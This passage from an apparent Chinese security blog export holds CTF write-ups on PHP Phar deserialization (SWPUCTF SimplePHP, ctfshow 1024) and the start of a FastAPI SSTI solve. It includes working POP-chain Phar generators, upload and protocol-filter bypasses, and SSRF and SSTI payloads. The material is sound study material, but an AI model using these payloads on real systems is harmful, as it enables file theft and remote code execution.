color;\n}\n```\n\n在这里我们定义了一个Cat猫的类，其中有猫的名字，年龄，毛色等属性变量（因为是在Object01.java类中另外定义的猫类，所以这里不需要加上修饰符），然后假如我们这里有一只小花猫叫小花，年龄是3岁，毛色为花色，我们如何获得这个猫的实例呢？\n\n## 访问实例变量和方法\n\n我们需要记得的是，类是一种引用数据类型，跟基本数据类型的使用是一样的\n\n```java\n/* 实例化对象 */\n类名 对象名 = new 类名();\n/* 访问类中的变量 */\n对象名.实例属性;\n/* 访问类中的方法 */\n对象名.类方法();\n```\n\n完整的代码\n\n```java\n//类和对象学习01\n\n//利用OOP思想定义猫类和实例对象\npublic class Object01 {\n\n    public static void main(String[] args) {\n        //实例化一只猫并赋值给cat1\n\n        Cat cat1 = new Cat();\n        cat1.name = \"小白\";\n        cat1.age = 3;\n        cat1.color = \"花色\";\n\n        //输出猫的信息\n        System.out.println(\"小猫的名字是: \" + cat1.name + \"\\n\"\n                + \"小猫的年龄是: \" + cat1.age + \"\\n\"\n                + \"小猫的毛色是: \" + cat1.color);\n    }\n}\n\n\n//定义一个猫类Cat\nclass Cat{\n    //定义猫的名字，年龄，毛色\n    String name;\n    int age;\n    String color;\n}\n\n```\n\n所以我们可以看出：\n\n- 类是抽象的，概念的，代表的是一类事物，也就是说类跟`int`，`double`一样，是自定义的引用数据类型\n- 而对象是具体的，实际的，例如`int a = 200`这个变量a是具体的，他有具体的数据类型和值：整型200\n- 简单来说类就是对象的模板，而对象则是类的一个实际个体\n\n## 内存中对象存在的形式\n\n因为类和数组一样都是引用类型，所以他们都是指向栈中的一个地址，而当我们实例化一个对象的上会，JVM会在堆中为对象分配一块连续的内存空间。但是需要注意的是，如果实例属性是基本数据类型，则会直接存放在堆中，如果不是基本数据类型，则会在堆中存放常量池中对应的地址，在常量池中存放数据，例如字符串\n\n![image-20250402131843325](../image/achieve/202411/java学习/image-20250402131843325.png)\n\n# SpringBoot开发\n\nSpringBoot 是基于 **Spring Framework** 的一个快速开发框架，旨在简化 **Java Web 应用程序** 的初始搭建和开发过程。\n","tags":["java"],"categories":["javasec"]},{"title":"Phar反序列化","url":"/2025/03/30/Phar反序列化/","content":"\n# 0x01前言\n\n因为做到了GXYCTF一道题的考点是phar反序列化，所以就来专门学习一下关于这个phar反序列化的知识点\n\n# 0x02正题\n\nPHP反序列化常见的是使用`unserilize()`进行反序列化，除此之外还有其它的反序列化方法，不需要用到`unserilize()`。就是用到了本文的主要内容——phar反序列化，用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。**漏洞触发是利用Phar:// 伪协议读取phar文件时，会反序列化meta-data储存的信息。**然后我去翻阅了大量大佬的文章进行学习，最后做成自己的笔记去方便自己以后随时可以看\n\n## 什么是phar?\n\nPhar(PHP归档)是将php文件打包而成的一种压缩文档，类似于Java中的jar包。这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。\n\n 它有一个特性就是phar文件会以序列化的形式储存用户自定义的`meta-data`。以扩展反序列化漏洞的攻击面，配合`phar://`协议使用。\n\nphp通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器\n\n### 常见的的流包装器\n\nfile:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器\nhttp:// — 访问 HTTP(s) 网址\nftp:// — 访问 FTP(s) URLs\nphp:// — 访问各个输入/输出流（I/O streams）\nzlib:// — 压缩流\ndata:// — 数据（RFC 2397）\nglob:// — 查找匹配的文件路径模式\nphar:// — PHP 归档\nssh2:// — Secure Shell 2\nrar:// — RAR\nogg:// — 音频流\nexpect:// — 处理交互式的流\n\nphar需要的php版本:php>=5.2，在PHP 5.3 或更高版本中默认开启\n\n## phar文件结构\n\nPhar文件主要包含三至四个部分：\n\n1. a stub\n\nstub的基本结构：**`xxx<?php xxx;__HALT_COMPILER();?>`，**前面内容不限，但必须以`__HALT_COMPILER();?>`来结尾，否则phar扩展将无法识别这个文件为phar文件。\n\n2. a manifest describing the contents\n\nPhar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点\n\n![img](./../image/achieve/202411/phar反序列化/1937992-20200602115238195-49897280.png)\n\n3. the file contents\n\n被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化\n\n4. a signature for verifying Phar integrity\n\n签名格式\n\n![img](./../image/achieve/202411/phar反序列化/1937992-20200602115337297-1986136175.png)\n\n这里我跟着大佬的wp进行了一次测试\n\n先修改php.ini配置文件中的phar.readonly为Off\n\n![image-20250330114654257](../image/achieve/202411/phar反序列化/image-20250330114654257.png)\n\n然后在web目录下创建一个1.php\n\n```PHP\n<?php \nclass test{\n\tpublic $name='phpinfo();';\n}\n$phar = new phar('test.phar');//后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER();?>\");//设置stub\n$obj = new test();\n$phar->setMetadata($obj);//自定义的meta-data存入manifest\n$phar->addFromString(\"flag.txt\",\"flag\");//添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n?>\n```\n\n在终端运行后,会生成一个text.phar在当前目录下。\n\n![image-20250330140717929](../image/achieve/202411/phar反序列化/image-20250330140717929.png)\n\n将text.phar用windex打开文件\n\n![image-20250330140846739](../image/achieve/202411/phar反序列化/image-20250330140846739.png)\n\n可以明显的看到meta-data是以序列化的形式存储的。有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过`phar://`伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：\n\n![img](./../image/achieve/202411/phar反序列化/1937992-20200602120704676-1021025129.png)\n\n然后我们写漏洞代码触发phar的反序列化\n\n```php\n<?php\nclass test{\n    public $name=\"\";\n    public function __destruct()\n    {\n        eval($this->name);\n    }\n}\n$phardemo = file_get_contents('phar://test.phar');\necho $phardemo;\n```\n\n然后访问这个漏洞文件，会发现刚刚序列化的对象被反序列化然后执行了\n\n![image-20250330142055059](../image/achieve/202411/phar反序列化/image-20250330142055059.png)\n\n\n\n## 漏洞利用条件\n\n1. phar可以上传到服务器端(存在文件上传)\n2. 要有可用的魔术方法作为“跳板”。\n3. 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤\n\n## 绕过方式\n\n1.最简单的就是用其他协议进行绕过了，例如\n\n```html\nphp://filter/read=convert.base64-encode/resource=phar://phar.phar\n```\n\n2.当环境限制了phar不能出现在前面的字符里。可以使用`compress.bzip2://`和`compress.zlib://`等绕过\n\n```\ncompress.bzip://phar:///test.phar/test.txt\ncompress.bzip2://phar:///test.phar/test.txt\ncompress.zlib://phar:///home/sx/test.phar/test.txt\n```\n\n3.GIF格式验证可以通过在文件头部添加GIF89a绕过\n\n```\n$phar->setStub(\"GIF89a<?php __HALT_COMPILER();?>\");\n```\n\n# 0x03例题\n\n## [SWPUCTF 2018]SimplePHP\n\n打开题目有查看文件和上传文件两个选项\n\n![image-20241123142407108](./../image/achieve/202411/phar反序列化/image-20241123142407108-1732343051256-12.png)\n\n查看源代码\n\n![image-20241123142512508](./../image/achieve/202411/phar反序列化/image-20241123142512508.png)\n\n发现有file参数可以查看文件\n\n然后我们可以看到有flag.php，我们用/file.php?file=flag.php查看一下\n\n![image-20241123142926439](./../image/achieve/202411/phar反序列化/image-20241123142926439.png)\n\n好吧并没有什么信息，我们看一下其他的文件\n\nindex.php\n\n```php\n<?php\nheader(\"content-type:text/html;charset=utf-8\");\ninclude 'base.php';\n?>\n```\n\nupload_file.php\n\n```php\n222.90.67.205\n<?php \ninclude 'function.php'; \nupload_file(); \n?> \n<html> \n<head> \n<meta charest=\"utf-8\"> \n<title>文件上传</title> \n</head> \n<body> \n<div align = \"center\"> \n        <h1>前端写得很low,请各位师傅见谅!</h1> \n</div> \n<style> \n    p{ margin:0 auto} \n</style> \n<div> \n<form action=\"upload_file.php\" method=\"post\" enctype=\"multipart/form-data\"> \n    <label for=\"file\">文件名:</label> \n    <input type=\"file\" name=\"file\" id=\"file\"><br> \n    <input type=\"submit\" name=\"submit\" value=\"提交\"> \n</div> \n\n</script> \n</body> \n```\n\nfunction.php\n\n```php\n<?php \n//show_source(__FILE__); \ninclude \"base.php\"; \nheader(\"Content-type: text/html;charset=utf-8\"); \nerror_reporting(0); \nfunction upload_file_do() { \n    global $_FILES; \n    $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; \n    //mkdir(\"upload\",0777); \n    if(file_exists(\"upload/\" . $filename)) { \n        unlink($filename); \n    } \n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); \n    echo '<script type=\"text/javascript\">alert(\"上传成功!\");</script>'; \n} \nfunction upload_file() { \n    global $_FILES; \n    if(upload_file_check()) { \n        upload_file_do(); \n    } \n} \nfunction upload_file_check() { \n    global $_FILES; \n    $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); \n    $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); \n    $extension = end($temp); \n    if(empty($extension)) { \n        //echo \"<h4>请选择上传的文件:\" . \"<h4/>\"; \n    } \n    else{ \n        if(in_array($extension,$allowed_types)) { \n            return true; \n        } \n        else { \n            echo '<script type=\"text/javascript\">alert(\"Invalid file!\");</script>'; \n            return false; \n        } \n    } \n} \n?> \n```\n\nbase.php\n\n```php\n<?php \n    session_start(); \n?> \n<!DOCTYPE html> \n<html> \n<head> \n    <meta charset=\"utf-8\"> \n    <title>web3</title> \n    <link rel=\"stylesheet\" href=\"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css\"> \n    <script src=\"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js\"></script> \n    <script src=\"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js\"></script> \n</head> \n<body> \n    <nav class=\"navbar navbar-default\" role=\"navigation\"> \n        <div class=\"container-fluid\"> \n        <div class=\"navbar-header\"> \n            <a class=\"navbar-brand\" href=\"index.php\">首页</a> \n        </div> \n            <ul class=\"nav navbar-nav navbra-toggle\"> \n                <li class=\"active\"><a href=\"file.php?file=\">查看文件</a></li> \n                <li><a href=\"upload_file.php\">上传文件</a></li> \n            </ul> \n            <ul class=\"nav navbar-nav navbar-right\"> \n                <li><a href=\"index.php\"><span class=\"glyphicon glyphicon-user\"></span><?php echo $_SERVER['REMOTE_ADDR'];?></a></li> \n            </ul> \n        </div> \n    </nav> \n</body> \n</html> \n<!--flag is in f1ag.php-->\n```\n\n这里可以看到在upload_file.php中包含了function.php，而function.php就是对上传文件的过滤，然后我们对function.php文件分析一下，我直接搬下来了，懒得翻来翻去\n\n```php\n<?php \n//show_source(__FILE__); \ninclude \"base.php\"; \nheader(\"Content-type: text/html;charset=utf-8\"); \nerror_reporting(0); \nfunction upload_file_do() { \n    global $_FILES; \n    $filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"; \n    //mkdir(\"upload\",0777); \n    if(file_exists(\"upload/\" . $filename)) { \n        unlink($filename); \n    } \n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" . $filename); \n    echo '<script type=\"text/javascript\">alert(\"上传成功!\");</script>'; \n} \nfunction upload_file() { \n    global $_FILES; \n    if(upload_file_check()) { \n        upload_file_do(); \n    } \n} \nfunction upload_file_check() { \n    global $_FILES; \n    $allowed_types = array(\"gif\",\"jpeg\",\"jpg\",\"png\"); \n    $temp = explode(\".\",$_FILES[\"file\"][\"name\"]); \n    $extension = end($temp); \n    if(empty($extension)) { \n        //echo \"<h4>请选择上传的文件:\" . \"<h4/>\"; \n    } \n    else{ \n        if(in_array($extension,$allowed_types)) { \n            return true; \n        } \n        else { \n            echo '<script type=\"text/javascript\">alert(\"Invalid file!\");</script>'; \n            return false; \n        } \n    } \n} \n?> \n```\n\n这个的话简单来说就是限制了文件上传的四种文件后缀，其他的就没什么可用的了\n\n可以看到存在一个file.php，我们也查看一下这个文件\n\nfile.php\n\n```php\n<?php \nheader(\"content-type:text/html;charset=utf-8\");  \ninclude 'function.php'; \ninclude 'class.php'; \nini_set('open_basedir','/var/www/html/'); \n//通过 open_basedir 限制 PHP 访问的文件目录，允许 PHP 只访问 /var/www/html/ 目录及其子目录。\n$file = $_GET[\"file\"] ? $_GET['file'] : \"\"; \n//从 URL 查询字符串中获取 file 参数。\nif(empty($file)) { \n    echo \"<h2>There is no file to show!<h2/>\"; \n} //检查是否为空\n$show = new Show(); \nif(file_exists($file)) { \n    $show->source = $file; \n    $show->_show(); \n} else if (!empty($file)){ \n    die('file doesn\\'t exists.'); \n} \n?> \n```\n\n额，然后这里又出现了一个class文件，也得读一下啊\n\nclass.php\n\n```php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n}\n\nclass Show\n{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;   //$this->source = phar://phar.jpg\n        echo $this->source;\n    }\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n    public function __set($key,$value)\n    {\n        $this->$key = $value;\n    }\n    public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n    public function __wakeup()\n    {\n        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker~\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test\n{\n    public $file;\n    public $params;\n    public function __construct()\n    {\n        $this->params = array();\n    }\n    public function __get($key)\n    {\n        return $this->get($key);\n    }\n    public function get($key)\n    {\n        if(isset($this->params[$key])) {\n            $value = $this->params[$key];\n        } else {\n            $value = \"index.php\";\n        }\n        return $this->file_get($value);\n    }\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n}\n?>\n```\n\n从file.php中可以看到是调用了class.php中的show类中的_show方法去检查file参数，我们单独分析一下这个方法\n\n```php\n  public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n```\n\n在_show()方法中对file参数进行了一定的过滤，其实这道题的非预期解的话是可以通过绕过去读取f1ag.php的，但是我们还是按照phar反序列化去进行解题，那我们就继续分析这个class.php\n\n可以发现在Test类中有file_get方法\n\n```php\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n```\n\n这个可以作为突破口去利用\n\n解题思路:\n\n首先生成一个phar文件，其中meta值里面是对class.php的序列化值，然后上传，获取文件的路径和文件名。然后，通过file参数访问该文件，file参数会经过`file_exists()`，直接触发phar进行反序列化，触发漏洞。那我们来构造一下pop链\n\n我们已经知道在Test类中的file_get()方法是我们最终需要调用的，所以这个方法可以作为pop链的出口，那我们进行倒推，我们先分析一下Test类\n\n```php\nclass Test\n{\n    public $file;\n    public $params;\n    public function __construct()\n    {\n        $this->params = array();\n    }\n    public function __get($key)\n    {\n        return $this->get($key);\n    }\n    public function get($key)\n    {\n        if(isset($this->params[$key])) {\n            $value = $this->params[$key];\n        } else {\n            $value = \"index.php\";\n        }\n        return $this->file_get($value);\n    }\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n}\n```\n\n- 在file_get()方法中，test为最终返回的内容，而test来源于里面的value参数，value参数来源于get()方法中的key参数，key参数是params数组中的一个键，我们需要触发这个get()方法，就需要触发我们的_get()魔术方法，而这个魔术方法的触发条件是读取不可访问或者是不存在的属性时触发，所以这里的链子是_\n\nTest::__get()->Test::get()->Test::file_get()\n\n为了触发我们的__get()魔术方法，我们可以设置我们的数组的一个键值对为params=array(“source”=>“f1ag.php”)，然后我们传入$key=“source”即可\n\n那继续倒推，我们应该怎么出发到get呢?\n\n我们再来分析一下Show类\n\n```php\nclass Show\n{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;   //$this->source = phar://phar.jpg\n        echo $this->source;\n    }\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n    public function __set($key,$value)\n    {\n        $this->$key = $value;\n    }\n    public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n    public function __wakeup()\n    {\n        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker~\";\n            $this->source = \"index.php\";\n        }\n    }\n}\n```\n\n既然我们需要设置一个键值对，我们可以发现这个类中有一个__toString()方法，在这个方法中\n\n1. $content = $this->str['str']->source;`: 这里假设 `$this->str` 是该对象的一个属性，它是一个数组，包含一个键 `'str'`，该键的值是一个对象，该对象有一个名为 `source` 的属性。方法将这个属性的值赋给 `$content`。\n\n所以这里的我们可以让我们的str键为一个对象，然后通过调用这个对象里的source赋值给content，那我们就令str[‘str’] = new Test()，因为Test中没有souce，所以可以触发__get魔术方法\n\n接着我们要思考怎么触发这个__toString()魔术方法\n\n对于__toString()魔术方法，当我们把对象当作字符串调用的时候会触发\n\n所以我们可以选择Cle4r类的_destruct()方法\n\n```php\nclass C1e4r\n{\n    public $test;\n    public $str;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test; \n    }\n}\n```\n\n为什么要选择这个方法呢？\n\n因为这里的话test参数是来自于str参数，而str参数是公共属性，可以由construct方法赋值，也可以由我们自己赋值，所以我们让str为Show对象就可以触发__toString()魔术方法了\n\n这样我们的pop链就理清楚了\n\n```\nCle4r::__destruct()->Show::__toString()->Test::__get()->Test::get()->Test::file_get()\n```\n\n知道pop链后我们就直接写payload\n\n```php\n<?php\n\nclass C1e4r\n{\n    public $test;\n    public $str;\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n}\n\nclass Show\n{\n    public $source;\n    public $str;\n}\nclass Test\n{\n    public $file;\n    public $params;\n    public function __construct()\n    {\n        $this->params = array('source'=>'/var/www/html/f1ag.php');\n    }\n\n}\n$c = new C1e4r();\n$s=new Show();\n$t =new Test();\n$c->str = $s;#触发__toString()方法\n$s->str['str'] = $t;#触发__get()方法\n$s->source=$s;#绕过wakeup()方法\n#Cle4r::__destruct()->Show::__toString()->Test::__get()->Test::get()->Test::file_get()\necho(serialize($c));\n$phar = new Phar(\"exp.phar\"); //.phar文件\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ? >'); //固定的\n$phar->setMetadata($c); //触发的头是C1e4r类，所以传入C1e4r对象\n$phar->addFromString(\"exp.txt\", \"test\"); //随便写点什么生成个签名\n$phar->stopBuffering();\n?>\n```\n\n写好payload后我们要在本地生成phar文件，这里直接运行一下就有phar文件了\n\n![image-20241123170839559](./../image/achieve/202411/phar反序列化/image-20241123170839559-1732352922684-14.png)\n\n有了之后改成允许上传的文件后缀，这里我改成jpg，上传后显示成功，我们查看一下上传的文件\n\n```\nurl/upload/\n```\n\n![image-20241123171301952](./../image/achieve/202411/phar反序列化/image-20241123171301952.png)\n\n这里可以看到我们上传的jpg文件\n\n然后我们用用phar伪协议访问我们的jpg文件\n\n![image-20241123171411973](./../image/achieve/202411/phar反序列化/image-20241123171411973.png)\n\n得到的base64编码拿去解码一下\n\n![image-20241123171522097](./../image/achieve/202411/phar反序列化/image-20241123171522097.png)\n\n这里可以拿到flag了\n","tags":["phar反序列化"],"categories":["phar反序列化"]},{"title":"ctfshow1024杯","url":"/2025/03/29/ctfshow1024杯/","content":"\n# 1024_WEB签到\n\n## #签到\n\n```php\nerror_reporting(0);\nhighlight_file(__FILE__);\ncall_user_func($_GET['f']);\n```\n\n动态函数调用，而且是无参数的函数\n\n```\n?f=phpinfo\n```\n\n![image-20250330145948122](../image/achieve/202411/1024杯/image-20250330145948122.png)\n\n一开始没什么头绪，就翻了一下php配置，看到里面有一个function\n\n![image-20250330150046889](../image/achieve/202411/1024杯/image-20250330150046889.png)\n\n\n\n调用这个函数就能拿到flag了\n\n```\n?f=ctfshow_1024\n```\n\n# 1024_柏拉图\n\n## #SSRF+phar反序列化\n\n![image-20250329001325077](../image/achieve/202411/1024杯/image-20250329001325077.png)\n\n口子挺多的，先常规转一圈看看,在index.php中有一个url参数，传入1后有回显\n\n```\n难道我不知道你在想什么？除非绕过我？！\n```\n\n提示很明显了，这里可以绕过，可是这里是干什么的呢？根据url参数来看这里应该是获取其他网站的资源用的，猜测存在SSRF，那我们用file协议读取一下本地的文件，看看能不能获取到源码\n\nfile协议被过滤了，用双写去绕过\n\n```\n?url=filefile://:///var/www/html/index.php\n```\n\n![image-20250330111557025](../image/achieve/202411/1024杯/image-20250330111557025.png)\n\n```php\n//index.php\nfunction curl($url){  \n    $ch = curl_init();\n    curl_setopt($ch, CURLOPT_URL, $url);\n    curl_setopt($ch, CURLOPT_HEADER, 0);\n    echo curl_exec($ch);\n    curl_close($ch);\n}\nif(isset($_GET['url'])){\n    $url = $_GET['url'];\n    $bad = 'file://';\n    if(preg_match('/dict|127|localhost|sftp|Gopherus|http|\\.\\.\\/|flag|[0-9]/is', $url,$match))\n\t\t{\n\t\t\tdie('难道我不知道你在想什么？除非绕过我？！');\n    }else{\n      $url=str_replace($bad,\"\",$url);\n      curl($url);\n    }\n}\n```\n\n```php\n//upload.php\nerror_reporting(0);\nif(isset($_FILES[\"file\"])){\nif (($_FILES[\"file\"][\"type\"]==\"image/gif\")&&(substr($_FILES[\"file\"][\"name\"], strrpos($_FILES[\"file\"][\"name\"], '.')+1))== 'gif') {\n\n    if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])){\n      echo $_FILES[\"file\"][\"name\"] . \" 文件已经存在啦！\";\n    }else{\n      move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\"upload/\" .$_FILES[\"file\"][\"name\"]);\n      echo \"文件存储在: \" . \"upload/\" . $_FILES[\"file\"][\"name\"];\n    }\n}else{\n      echo \"这个文件我不喜欢，我喜欢一个gif的文件\";\n    }\n}\n```\n\n```php\n//readfile.php\ninclude('class.php');\nfunction check($filename){  \n    if (preg_match(\"/^phar|^smtp|^dict|^zip|file|etc|root|filter|\\.\\.\\//i\",$filename)){\n        die(\"姿势太简单啦，来一点骚的？！\");\n    }else{\n        return 0;\n    }\n}\nif(isset($_GET['filename'])){\n    $file=$_GET['filename'];\n        if(strstr($file, \"flag\") || check($file) || strstr($file, \"php\")) {\n            die(\"这么简单的获得不可能吧？！\");\n        }\n        echo readfile($file);\n}\n```\n\n```php\n//unlink.php\nerror_reporting(0);\n$file=$_GET['filename'];\nfunction check($file){  \n  if (preg_match(\"/\\.\\.\\//i\",$file)){\n      die(\"你想干什么？！\");\n  }else{\n      return $file;\n  }\n}\nif(file_exists(\"upload/\".$file)){\n      if(unlink(\"upload/\".check($file))){\n          echo \"删除\".$file.\"成功！\";\n      }else{\n          echo \"删除\".$file.\"失败！\";\n      }\n}else{\n    echo '要删除的文件不存在！';\n}\n```\n\n一开始以为是打文件上传的后缀名绕过，但是好像这里也打不了上传文件的，看wp发现漏读了文件class.php\n\n```php\n//class.php\n<?php\nerror_reporting(0);\nclass A {\n    public $a;\n    public function __construct($a)\n    {\n        $this->a = $a;\n    }\n    public function __destruct()\n    {\n        echo \"THI IS CTFSHOW\".$this->a;\n    }\n}\nclass B {\n    public $b;\n    public function __construct($b)\n    {\n        $this->b = $b;\n    }\n    public function __toString()\n    {\n        return ($this->b)();\n    }\n}\nclass C{\n    public $c;\n    public function __construct($c)\n    {\n        $this->c = $c;\n    }\n    public function __invoke()\n    {\n        return eval($this->c);\n    }\n}\n?>\n```\n\nreadfile.php中过滤的比较死，很多伪协议都不能用，但是能用phar协议，然后结合class.php中的内容，猜测是phar反序列化\n\nphp一大部分的文件系统函数在通过`phar://`伪协议解析phar文件时，都会将meta-data进行反序列化，例如这个题目中的readfile函数，那我们先看class.php写poc链\n\n```\nA::__destruct()->B::__toString()->C::__invoke()\n```\n\nexp\n\n```php\n//class.php\n<?php\nerror_reporting(0);\nclass A {\n    public $a;\n}\nclass B {\n    public $b;\n}\nclass C{\n    public $c;\n}\n$a = new A();\n$a->a = new B();\n$a->a->b = new C();\n$a->a->b->c='phpinfo();';\n```\n\n然后打包phar文件\n\n```php\n//class.php\n<?php\nerror_reporting(0);\nclass A {\n    public $a;\n}\nclass B {\n    public $b;\n}\nclass C{\n    public $c;\n}\n$a = new A();\n$a->a = new B();\n$a->a->b = new C();\n$a->a->b->c='phpinfo();';\n$phar = new Phar(\"phar.phar\");\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\");\n$phar->setMetadata($a);\n$phar->addFromString(\"1.txt\",\"1\");\n$phar->stopBuffering();\n?>\n```\n\n运行后将生成的phar文件修改后缀为.gif然后伪造MIME类型并上传\n\n![image-20250330144002171](../image/achieve/202411/1024杯/image-20250330144002171.png)\n\n![image-20250330144145451](../image/achieve/202411/1024杯/image-20250330144145451.png)\n\n在读取文件的页面下\n\n```php\n    if (preg_match(\"/^phar|^smtp|^dict|^zip|file|etc|root|filter|\\.\\.\\//i\",$filename)){\n        die(\"姿势太简单啦，来一点骚的？！\");\n```\n\n禁用了phar前缀，当环境限制了phar不能出现在前面的字符里。可以使用`compress.bzip2://`和`compress.zlib://`等绕过\n\n所以我们传参\n\n```\ncompress.zlib://phar://upload/phar.gif\n```\n\n![image-20250330144443638](../image/achieve/202411/1024杯/image-20250330144443638.png)\n\n成功反序列化并执行，改一下exp的内容然后拿flag就行\n\n![image-20250330144709784](../image/achieve/202411/1024杯/image-20250330144709784.png)\n\n# 1024_fastapi\n\n## #SSTI\n\nFastAPI是基于python3.6+和标准python类型的一个现代化的，快速的(高性能),构建api的web框架。\n\n```\n{\"hello\":\"fastapi\"}\n```\n\n页面只有这个，目录扫出来三个路径\n\n```\n[15:04:44] 200 -   974B - /docs\n[15:04:53] 200 -    1KB - /openapi.json\n[15:04:57] 200 -   767B - /redoc\n```\n\n访问openapi.json得到**OpenAPI 3.0**的自带交互式API文档\n\n```\n{\n  \"openapi\": \"3.0.2\",\n  \"info\": {\n    \"title\": \"FastAPI\",\n    \"version\": \"0.1.0\"\n  },\n  \"paths\": {\n    \"/\": {\n      \"get\": {\n        \"summary\": \"Hello\",\n        \"operationId\": \"hello__get\",\n        \"responses\": {\n          \"200\": {\n            \"description\": \"Successful Response\",\n            \"content\": {\n              \"application/json\": {\n                \"schema\": {\n\n                }\n              }\n            }\n          }\n        }\n      }\n    },\n    \"/cccalccc\": {\n      \"post\": {\n        \"summary\": \"Calc\",\n        \"description\": \"安全的计算器\",\n        \"operationId\": \"calc_cccalccc_post\",\n        \"requestBody\": {\n          \"content\": {\n            \"application/x-www-form-urlencoded\": {\n              \"schema\": {\n                \"$ref\": \"#/components/schemas/Body_calc_cccalccc_post\"\n              }\n            }\n          },\n          \"required\": true\n        },\n        \"responses\": {\n          \"200\": {\n            \"description\": \"Successful Response\",\n            \"content\": {\n              \"application/json\": {\n                \"schema\": {\n\n                }\n              }\n            }\n          },\n          \"422\": {\n            \"description\": \"Validation Error\",\n            \"content\": {\n              \"application/json\": {\n                \"schema\": {\n                  \"$ref\": \"#/components/schemas/HTTPValidationError\"\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  },\n  \"components\": {\n    \"schemas\": {\n      \"Body_calc_cccalccc_post\": {\n        \"title\": \"Body_calc_cccalccc_post\",\n        \"required\": [\n          \"q\"\n        ],\n        \"type\": \"object\",\n        \"properties\": {\n          \"q\": {\n            \"title\": \"Q\",\n            \"type\": \"string\"\n          }\n        }\n      },\n      \"HTTPValidationError\": {\n        \"title\": \"HTTPValidationError\",\n        \"type\": \"object\",\n        \"properties\": {\n          \"detail\": {\n            \"title\": \"Detail\",\n            \"type\": \"array\",\n            \"items\": {\n              \"$ref\": \"#/components/schemas/ValidationError\"\n            }\n          }\n        }\n      },\n      \"ValidationError\": {\n        \"title\": \"ValidationError\",\n        \"required\": [\n          \"loc\",\n          \"msg\",\n          \"type\"\n        ],\n        \"type\": \"object\",\n        \"properties\": {\n          \"loc\": {\n            \"title\": \"Location\",\n            \"type\": \"array\",\n            \"items\": {\n              \"type\": \"string\"\n            }\n          },\n          \"msg\": {\n            \"title\": \"Message\",\n            \"type\": \"string\"\n          },\n          \"type\": {\n            \"title\": \"Error Type\",\n            \"type\": \"string\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n有一个Hello的测试接口和/cccalccc接口，/cccalccc接口是一个安全计算器，里面有一个q参数，了解了一下fastapi得知它具有方便的api文档/redoc和/docs，然后我们访问/docs并进行测试\n\npython的ssti，尝试一下\n\n```\nq=[].__class__\t\t#Internal Server Error\n```\n\nFastAPI 默认用 JSON 返回，但 `type` 对象不可 JSON 序列化，需要用str()转化\n\n`str()` 将结果转为字符串\n即使 `[].__class__` 是 `type` 对象，`str()` 会转换为可序列化的字符串 `\"<class 'list'>\"`，因此能正常返回。\n\n```\nq=str([].__class__)\t#{\"res\":\"<class 'list'>\",\"err\":false}\nq=str([].__class__.__base__.__subclasses__()[127]) #{\"res\":\"<class 